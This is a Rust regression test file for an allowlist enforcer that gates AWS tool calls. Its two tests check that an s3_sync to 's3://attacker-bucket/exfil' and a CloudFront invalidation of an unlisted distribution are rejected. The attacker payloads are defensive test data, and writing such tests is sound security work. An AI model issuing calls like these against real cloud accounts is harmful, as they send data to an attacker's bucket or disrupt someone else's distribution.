//! Integration smoke — AC-M2-6 boundary.
//!
//! These two tests are the canonical regression for the bug discovered while
//! validating Milestone 2 boundary cases (ISSUE-KVD-CLI-031): the allowlist
//! enforcer was reading constraint inputs from the top-level envelope instead
//! of the inner `args` payload, and 19 declared DSL fields were never
//! enforced. As a result, an attacker-controlled `aws s3_sync` call could
//! target a bucket outside the allowlist and a `cloudfront_invalidate` call
//! could touch an arbitrary distribution.
//!
//! The fix landed in v0.1.0-alpha.10. These tests drive the public allowlist
//! `check()` API against the canonical MCP envelope shape
//! `{profile_id, operation, args: { ... }}` so any future regression would
//! be caught here.

use kvendra::allowlist::dsl::ProfileSpec;
use kvendra::allowlist::enforcer::check;
use kvendra::error::KvendraError;
use serde_json::json;

const KVENDRA_AWS_ALLOWLIST_YAML: &str = r#"
profile_id: aws.kvendra.deployer
secret:
  type: aws_keys
allowlist:
  primitives:
    - name: kvendra.aws
      operations:
        - s3_sync:
            buckets: ["kvendra-com-prod"]
            accept_destructive: true
        - cloudfront_invalidate:
            distributions: ["E2MSK8NR0QTV9W"]
            accept_destructive: true
"#;

#[test]
fn aws_s3_sync_blocks_bucket_outside_allowlist() {
    // CANONICAL REGRESSION TEST — AC-M2-6 (ISSUE-KVD-CLI-031).
    let spec = ProfileSpec::from_yaml(KVENDRA_AWS_ALLOWLIST_YAML).unwrap();

    // Allowed call — bucket matches the allowlist.
    let allowed = json!({
        "profile_id": "aws.kvendra.deployer",
        "operation": "s3_sync",
        "args": {
            "src": "./build",
            "dst": "s3://kvendra-com-prod/site"
        }
    });
    assert!(check(&spec, "kvendra.aws", "s3_sync", &allowed).is_ok());

    // Attacker call — bucket outside the allowlist must be blocked.
    let attacker = json!({
        "profile_id": "aws.kvendra.deployer",
        "operation": "s3_sync",
        "args": {
            "src": "./build",
            "dst": "s3://attacker-bucket/exfil"
        }
    });
    let err = check(&spec, "kvendra.aws", "s3_sync", &attacker)
        .expect_err("attacker bucket must be rejected by the enforcer");
    match err {
        KvendraError::AllowlistViolation(msg) => {
            assert!(msg.contains("attacker-bucket"), "msg: {msg}");
        }
        other => panic!("expected AllowlistViolation, got {other:?}"),
    }
}

#[test]
fn aws_cloudfront_invalidate_blocks_distribution_outside_allowlist() {
    let spec = ProfileSpec::from_yaml(KVENDRA_AWS_ALLOWLIST_YAML).unwrap();

    let allowed = json!({
        "profile_id": "aws.kvendra.deployer",
        "operation": "cloudfront_invalidate",
        "args": {
            "distribution_id": "E2MSK8NR0QTV9W",
            "paths": ["/*"]
        }
    });
    assert!(check(&spec, "kvendra.aws", "cloudfront_invalidate", &allowed).is_ok());

    let attacker = json!({
        "profile_id": "aws.kvendra.deployer",
        "operation": "cloudfront_invalidate",
        "args": {
            "distribution_id": "E0FAKE0FAKE0FA",
            "paths": ["/*"]
        }
    });
    let err = check(&spec, "kvendra.aws", "cloudfront_invalidate", &attacker)
        .expect_err("non-allowlisted distribution must be rejected");
    match err {
        KvendraError::AllowlistViolation(msg) => {
            assert!(msg.contains("E0FAKE0FAKE0FA"), "msg: {msg}");
        }
        other => panic!("expected AllowlistViolation, got {other:?}"),
    }
}
